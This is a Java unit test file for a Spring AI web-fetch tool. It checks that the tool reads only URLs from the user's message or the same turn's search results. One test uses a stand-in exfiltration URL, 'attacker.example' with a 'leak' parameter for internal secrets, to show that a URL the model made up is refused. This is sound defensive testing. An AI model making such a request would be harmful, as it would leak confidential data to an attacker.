package com.onggijonggi.api.web;

import static org.assertj.core.api.Assertions.assertThat;

import java.net.URI;
import java.net.http.HttpClient;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import org.junit.jupiter.api.Test;
import org.springframework.ai.chat.model.ToolContext;
import org.springframework.boot.context.properties.bind.Bindable;
import org.springframework.boot.context.properties.bind.Binder;
import org.springframework.boot.context.properties.source.MapConfigurationPropertySource;

/**
 * Class Name : WebToolsTest.java
 * Description : 웹 도구의 허락 목록을 검증한다 — 사용자 발화와 같은 턴의 검색 결과 주소만 읽고, 지어낸 주소는 거부하며, 턴끼리 섞이지 않는다.
 *               실패를 사유 문장으로 돌려주는 것과 본문 글자 수 자르기도 본다. 성공한 검색·읽기만 웹 출처로 남는지도 본다(이슈 #401).
 */
class WebToolsTest {

	private static final WebProperties PROPERTIES = new Binder(new MapConfigurationPropertySource())
			.bindOrCreate("app.web", Bindable.of(WebProperties.class));

	/** 읽은 주소를 기록하고 정해진 페이지를 돌려준다. */
	private static class RecordingFetcher extends WebFetcher {
		final List<URI> fetched = new ArrayList<>();

		RecordingFetcher() {
			super(HttpClient.newHttpClient(), new PublicUrlGuard(), PROPERTIES.fetch());
		}

		@Override
		Page fetch(URI start) {
			fetched.add(start);
			return new Page(start, "제목", "본문");
		}
	}

	private final RecordingFetcher fetcher = new RecordingFetcher();
	private final WebTools tools = new WebTools(PROPERTIES,
			(query, limit) -> List.of(new WebSearchProvider.Result("Spring", "https://spring.io/guides#top", "요약")), fetcher);

	@Test
	void allowsUrlsFromUserMessagesTrimmingSentencePunctuation() {
		Object allowed = tools.context(List.of("이거 읽어줘 https://Example.com/a?b=1#x. 그리고 http://test.org)"), new WebSources())
				.get(WebTools.ALLOWED_URLS);
		assertThat((Set<Object>) allowed).containsExactlyInAnyOrder("https://example.com/a?b=1", "http://test.org/");
	}

	@Test
	void refusesUrlsTheModelMadeUp() {
		ToolContext context = new ToolContext(tools.context(List.of("요약해줘"), new WebSources()));

		String answer = tools.webFetch("https://attacker.example/?leak=사내기밀", context);

		assertThat(answer).contains("읽을 수 없다");
		assertThat(fetcher.fetched).isEmpty();
	}

	@Test
	void allowsFetchingSearchResultsOfTheSameTurn() {
		ToolContext context = new ToolContext(tools.context(List.of("스프링 가이드 찾아줘"), new WebSources()));

		assertThat(tools.webSearch("spring guides", context)).contains("1. Spring").contains("https://spring.io/guides#top");
		String answer = tools.webFetch("https://spring.io/guides", context);

		assertThat(fetcher.fetched).containsExactly(URI.create("https://spring.io/guides"));
		assertThat(answer).startsWith("[외부 웹 페이지 내용").contains("제목: 제목").contains("본문");
	}

	@Test
	void searchResultsDoNotCarryOverToAnotherTurn() {
		tools.webSearch("spring guides", new ToolContext(tools.context(List.of(), new WebSources())));

		assertThat(tools.webFetch("https://spring.io/guides", new ToolContext(tools.context(List.of(), new WebSources())))).contains("읽을 수 없다");
	}

	@Test
	void returnsSearchFailureAsASentenceForTheModel() {
		WebTools failing = new WebTools(PROPERTIES, (query, limit) -> {
			throw new WebToolException("DuckDuckGo가 자동 요청으로 보고 막았다");
		}, fetcher);

		assertThat(failing.webSearch("q", new ToolContext(failing.context(List.of(), new WebSources()))))
				.isEqualTo("웹 검색을 할 수 없다: DuckDuckGo가 자동 요청으로 보고 막았다");
	}

	@Test
	void recordsSuccessfulSearchesAndReadsAsWebSources() {
		WebSources sources = new WebSources();
		ToolContext context = new ToolContext(tools.context(List.of("스프링 가이드 찾아줘"), sources));

		tools.webSearch(" spring guides ", context);
		tools.webFetch("https://spring.io/guides", context);

		assertThat(sources.sources()).singleElement().isEqualTo(
				new WebSources.Source("https://spring.io/guides", "제목", "요약", "spring guides", true));
	}

	@Test
	void stillAnswersTheModelWhenRecordingASourceFails() {
		WebSources broken = new WebSources() {
			@Override
			synchronized void addSearch(String query, List<WebSearchProvider.Result> results) {
				throw new IllegalStateException("기록 실패");
			}

			@Override
			synchronized void addPage(String requestedKey, String finalUrl, String title) {
				throw new IllegalStateException("기록 실패");
			}
		};
		ToolContext context = new ToolContext(tools.context(List.of("스프링 가이드 찾아줘"), broken));

		assertThat(tools.webSearch("spring guides", context)).contains("1. Spring");
		assertThat(tools.webFetch("https://spring.io/guides", context)).startsWith("[외부 웹 페이지 내용");
	}

	@Test
	void doesNotRecordFailedOrRefusedCalls() {
		WebSources sources = new WebSources();
		WebFetcher failingFetcher = new RecordingFetcher() {
			@Override
			Page fetch(URI start) {
				throw new WebToolException("연결 실패");
			}
		};
		WebTools empty = new WebTools(PROPERTIES, (query, limit) -> List.of(), failingFetcher);
		WebTools failing = new WebTools(PROPERTIES, (query, limit) -> {
			throw new WebToolException("막힘");
		}, failingFetcher);
		ToolContext context = new ToolContext(empty.context(List.of("https://a.com/ 읽어줘"), sources));

		empty.webSearch("결과 없는 검색", context);
		failing.webSearch("실패한 검색", context);
		empty.webFetch("https://not-allowed.example/", context);
		empty.webFetch("https://a.com/", context);

		assertThat(sources.sources()).isEmpty();
	}

	@Test
	void truncatesLongPagesToTheCharacterLimit() {
		WebFetcher longPage = new RecordingFetcher() {
			@Override
			Page fetch(URI start) {
				return new Page(start, "", "가".repeat(PROPERTIES.fetch().maxChars() + 10));
			}
		};
		WebTools limited = new WebTools(PROPERTIES, (query, limit) -> List.of(), longPage);

		String answer = limited.webFetch("https://a.com/", new ToolContext(limited.context(List.of("https://a.com/"), new WebSources())));

		assertThat(answer).contains("자에서 잘림").doesNotContain("가".repeat(PROPERTIES.fetch().maxChars() + 1));
	}
}
